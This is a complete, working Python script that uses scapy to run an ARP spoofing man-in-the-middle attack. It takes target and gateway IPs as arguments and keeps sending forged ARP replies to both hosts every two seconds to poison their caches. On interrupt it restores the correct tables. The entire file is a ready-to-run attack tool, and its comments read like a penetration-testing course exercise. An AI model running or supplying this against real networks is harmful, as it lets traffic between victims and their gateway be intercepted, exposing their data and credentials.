#!/usr/bin/env python

# optparse module to get arguments from line

import optparse

# sys for flushing the buffer

import sys

# scapy module for arp requests

import scapy.all as scapy

# time module for a delay

import time


# getting the arguments from user


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target ip for spoofing")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway ip for spoofing")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target ip, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway ip, use --help for more info")
    return options


# getting the mac of the ip given


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


# making the arp spoof to target ip and spoof ip


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# restore ips and macs


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# get values from command line

options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

# loop for keep sending packets to maintain the attack and restore arp tables when keyboard interrupt

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ......... Resetting ARP tables...... Please wait..\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Arp tables restored successfully. ")
